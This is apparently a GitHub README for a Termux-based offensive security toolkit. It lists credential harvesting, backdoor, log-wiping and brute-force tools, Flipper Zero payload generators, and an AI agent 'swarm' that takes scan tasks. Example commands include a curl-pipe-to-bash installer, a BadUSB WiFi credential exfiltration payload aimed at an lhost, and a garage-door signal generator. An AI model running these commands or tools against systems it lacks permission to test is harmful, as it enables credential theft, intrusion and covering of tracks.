# 🐝 HIVE OS — Hacker Edition v2.2

**Self-Healing | Multi-Agent | Termux-Ready | Flipper-Ready**

Complete penetration testing operating system for Android (via Termux). 45+ security tools, AI Swarm orchestration, and now Flipper Zero integration.

```
    ╔═══════════════════════════════════════════════════════════════╗
    ║                                                               ║
    ║   🐝  HIVE OS v2.2 — Hacker Edition                             ║
    ║                                                               ║
    ║   Self-Healing • Multi-Agent • Termux-Ready • Flipper-Ready  ║
    ║                                                               ║
    ╚═══════════════════════════════════════════════════════════════╝
```

---

## 📱 ONE-LINE INSTALL

```bash
curl -sSL https://raw.githubusercontent.com/kaibuzz0/Hive-hacker-edition/main/install.sh | bash
```

Lost your phone? New device, same command — fully restored in minutes.

---

## 🏗️ System Architecture

```
Hive OS v2.2
├── Core Swarm (AI Multi-Agent System)
│   ├── orchestrator.py      - Task delegation & verification
│   ├── assistant_agent.py   - Quality verification
│   ├── architect_agent.py   - Code & security review
│   ├── self_heal.py         - Auto-repair system
│   ├── port_manager.sh      - Network configuration
│   └── backup_manager.py    - Backup & restore
│
├── Security Tools (45+)
│   ├── 10-RECON/            - Reconnaissance (7 tools)
│   ├── 20-SCANNING/         - Network scanning (6 tools)
│   ├── 30-EXPLOITATION/     - Exploitation (6 tools)
│   ├── 40-POST-EXPLOIT/     - Post-exploitation (5 tools)
│   ├── 50-REPORTING/        - Reporting & forensics (5 tools)
│   ├── 60-ANONYMITY/        - Tor & privacy (2 tools)
│   ├── 70-CRYPTO/           - Cryptography (6 tools)
│   ├── 80-WIRELESS/         - Wireless tools (1 tool)
│   └── 85-FLIPPER-Zero/      - Flipper Zero plugin (5 tools) ⭐ NEW
│
└── Integration
    ├── hive.py                - Unified launcher
    ├── setup.sh               - One-command installer
    └── manifest.json          - Dependencies
```

---

## 🚀 Quick Start

```bash
# 1. Install (one-time)
curl -sSL https://raw.githubusercontent.com/kaibuzz0/Hive-hacker-edition/main/install.sh | bash

# 2. Launch Hive OS
hive                       # Interactive menu
hive --swarm               # AI Swarm mode
hive --status              # System health check

# 3. Use any tool directly
python3 85-FLIPPER-Zero/flipper_subghz.py --list-db
python3 70-CRYPTO/hash_cracker.py --help
python3 30-EXPLOITATION/payload_generator.py --list
```

---

## 📦 Tool Inventory

### 🔍 10-RECON — Reconnaissance
| Tool | Purpose | Key Feature |
|------|---------|-------------|
| `banner_grab.py` | Service banner grabbing | Multi-port, timeout control |
| `binary_analyzer.py` | Static binary analysis | ELF/PE header parsing |
| `dns_enum.py` | DNS enumeration | AXFR, brute force |
| `memory_tracer.py` | Process memory analysis | Heap/stack inspection |
| `resonance_scanner.py` | Target profiling | Multi-vector recon |
| `subdomain_brute.py` | Subdomain brute force | Wordlist + permutation |
| `whois_enum.py` | WHOIS lookups | Registrar + contact |

### 🔎 20-SCANNING — Network Scanning
| Tool | Purpose | Key Feature |
|------|---------|-------------|
| `dir_bruter.py` | Directory brute force | Extension mutations |
| `heap_analyzer.py` | Heap memory analysis | Use-after-free detection |
| `net_sniffer.py` | Packet capture | Promiscuous mode |
| `network_scanner.py` | Network discovery | CIDR range support |
| `port_scanner.py` | TCP/UDP port scan | SYN/Connect/UDP |
| `web_scanner.py` | Web vulnerability scan | Crawl + detect |

### 💥 30-EXPLOITATION — Exploitation
| Tool | Purpose | Key Feature |
|------|---------|-------------|
| `exploit_search.py` | Exploit-DB search | Offline + online |
| `fuzz_tester.py` | Protocol fuzzing | Mutation engine |
| `payload_generator.py` | Shellcode/payload gen | Multi-arch |
| `payload_injector.py` | Runtime injection | DLL/shellcode |
| `sql_injector.py` | SQL injection | Error/time-based |
| `ssh_brute.py` | SSH brute force | Key + password |
| `xss_tester.py` | XSS detection | Stored/DOM/Reflected |

### 🕵️ 40-POST-EXPLOIT — Post-Exploitation
| Tool | Purpose | Key Feature |
|------|---------|-------------|
| `backdoor_manager.py` | Persistence management | Startup/Cron/Services |
| `cred_harvester.py` | Credential extraction | Memory + files |
| `obfuscator.py` | Payload obfuscation | XOR/Base64/Polymorphic |
| `privesc_checker.py` | Privilege escalation | SUID/Cron/Kernel |
| `stealth_wrapper.py` | Anti-forensics | Log wiping |

### 📊 50-REPORTING — Reporting & Forensics
| Tool | Purpose | Key Feature |
|------|---------|-------------|
| `forensic_analyzer.py` | Disk/memory forensics | Timeline reconstruction |
| `integrity_checker.py` | File integrity monitoring | Hash-based alerts |
| `keylogger_detector.py` | Detect keyloggers | Hook detection |
| `report_generator.py` | PDF/HTML reports | Template engine |
| `system_monitor.py` | Real-time monitoring | Process + network |

### 🎭 60-ANONYMITY — Privacy
| Tool | Purpose | Key Feature |
|------|---------|-------------|
| `tor_manager.py` | Tor control | Circuit rotation |
| `secure_vault.py` | Encrypted storage | AES-256-GCM |

### 🔐 70-CRYPTO — Cryptography
| Tool | Purpose | Key Feature |
|------|---------|-------------|
| `chain_analyzer.py` | Blockchain analysis | Transaction tracing |
| `cipher_decoder.py` | Classical cipher cracker | Caesar/Vigenere/ROT |
| `crypto_sim.py` | Encryption simulation | Visualize algorithms |
| `hash_cracker.py` | Hash cracking | Dictionary + brute |
| `stego_tool.py` | Steganography | LSB/Metadata/DCT |
| `wallet_tools.py` | Crypto wallet utils | Key derivation |

### 📡 80-WIRELESS — Wireless
| Tool | Purpose | Key Feature |
|------|---------|-------------|
| `wifi_scanner.py` | WiFi reconnaissance | BSS + client detection |

---

## 🐬 85-FLIPPER-Zero — Flipper Zero Plugin

**NEW in v2.2** — Generate Flipper payloads and bridge to real hardware.

| Protocol | Generate | Analyze | Bridge via USB OTG |
|----------|----------|---------|-------------------|
| **Sub-GHz** | `.sub` | ✅ | ✅ |
| **NFC** | `.nfc` | ✅ | ✅ |
| **IR** | `.ir` | ✅ | ✅ |
| **BadUSB** | `.badusb` | — | ✅ |

### Quick Examples

```bash
# Sub-GHz — generate a CAME garage door signal
python3 85-FLIPPER-Zero/flipper_subghz.py --protocol came --freq 433.92 --key 0x123 --file garage.sub

# NFC — generate a writable tag with text payload
python3 85-FLIPPER-Zero/flipper_nfc.py --type mifare_ultralight --uid 0x04AABBCCDDEEFF --data "Hello" --file hello.nfc

# IR — export a Samsung TV remote
python3 85-FLIPPER-Zero/flipper_ir.py --device samsung_tv --file samsung.ir

# BadUSB — Windows WiFi credential exfiltration
python3 85-FLIPPER-Zero/flipper_badusb.py --os windows --payload wifi_grab --lhost 192.168.1.100 --file wifi.txt

# Bridge — connect to real Flipper over USB OTG
python3 85-FLIPPER-Zero/flipper_bridge.py --scan
python3 85-FLIPPER-Zero/flipper_bridge.py --port /dev/ttyACM0 --interactive
```

### Transfer to Flipper

All files are valid Flipper format. Transfer via:
- **qFlipper** desktop app + USB cable
- **SD card** directly → `/ext/subghz/`, `/ext/nfc/`, `/ext/infrared/`, `/ext/badusb/`

### Requirements

- USB OTG cable (bridge mode)
- pyserial: `pip install pyserial`
- qFlipper app (file transfer)

---

## 🧠 Swarm Mode

AI-powered task delegation with verification chains:

```
User → Main AI → Swarm → Agent → Architect Review → Assistant Verification → Delivery
```

```bash
hive --swarm
# or in Python:
from core.orchestrator import SwarmOrchestrator
orch = SwarmOrchestrator()
task_id = orch.delegate_task("Scan 192.168.1.0/24", "executor_agent")
```

---

## 🔧 Core Systems

### Self-Healing
```bash
python3 core/self_heal.py           # Health check
python3 core/self_heal.py --repair  # Auto-repair
python3 core/self_heal.py --daemon  # Background monitor
```

### Port Management
```bash
core/port_manager.sh init           # Initialize
core/port_manager.sh status         # Status
core/port_manager.sh repair         # Repair network
```

### Backup & Restore
```bash
python3 core/backup_manager.py create --name my_backup
python3 core/backup_manager.py list
python3 core/backup_manager.py restore --file backup.tar.gz
python3 core/backup_manager.py export --output ./hive-clean  # GitHub-safe
```

---

## 🔄 Hermes Integration

| Port | Purpose |
|------|---------|
| 8766 | Hermes Bridge |
| 8767 | Swarm Communication |
| 8768 | Backup Service |

Shared JSON queue: `~/.hive/hermes_queue.json`

---

## 📁 File Map

```
~
├── .hive/                           # Runtime data
│   ├── core/
│   │   ├── orchestrator.py
│   │   ├── hive_mq.py              # File-based message queue
│   │   ├── hive_runner.py          # Agent spawner
│   │   ├── hive_verify.py          # Verification chains
│   │   └── agents/
│   │       ├── assistant_agent.py
│   │       └── architect_agent.py
│   ├── registry.json               # Agent registry
│   ├── backups/                    # Auto backups
│   ├── logs/                       # System logs
│   └── hermes_queue.json          # Hermes bridge
│
├── Hive-hacker-edition/            # Repo
│   ├── hive.py                     # Unified launcher
│   ├── install.sh                  # Installer
│   ├── setup.sh                    # One-command setup
│   ├── manifest.json               # Dependencies
│   │
│   ├── 10-RECON/                   # Reconnaissance tools
│   ├── 20-SCANNING/                # Scanning tools
│   ├── 30-EXPLOITATION/            # Exploitation tools
│   ├── 40-POST-EXPLOIT/            # Post-exploitation tools
│   ├── 50-REPORTING/               # Reporting tools
│   ├── 60-ANONYMITY/               # Privacy tools
│   ├── 70-CRYPTO/                  # Cryptography tools
│   ├── 80-WIRELESS/                # Wireless tools
│   └── 85-FLIPPER-Zero/            # Flipper plugin ⭐
│       ├── flipper_subghz.py
│       ├── flipper_nfc.py
│       ├── flipper_ir.py
│       ├── flipper_badusb.py
│       └── flipper_bridge.py
│
└── bin/                            # Symlinks to tools
```

---

## 🆘 Troubleshooting

| Problem | Fix |
|---------|-----|
| Registry corrupted | `python3 core/self_heal.py --repair` |
| Ports not responding | `core/port_manager.sh repair` |
| Swarm won't start | Check `~/.hive/logs/` for errors |
| Flipper bridge fails | `pip install pyserial` + check USB OTG |
| Clean slate needed | `rm -rf ~/.hive && ./setup.sh` |

---

## 📋 Changelog

| Version | Changes |
|---------|---------|
| **v2.2** | Flipper Zero plugin (5 tools), updated README |
| v2.1 | Real file-based message queue, agent runner, verification |
| v2.0 | Self-healing system, swarm orchestration, backup manager |
| v1.x | Simulation-based architecture |

---

## ⚠️ Disclaimer

For **authorized security testing only**. All tools are for educational and professional security research purposes. Only use on systems you own or have explicit permission to test.

---

**Hive OS v2.2** | Self-Healing Multi-Agent System | Termux-Ready | Flipper-Ready 🐝
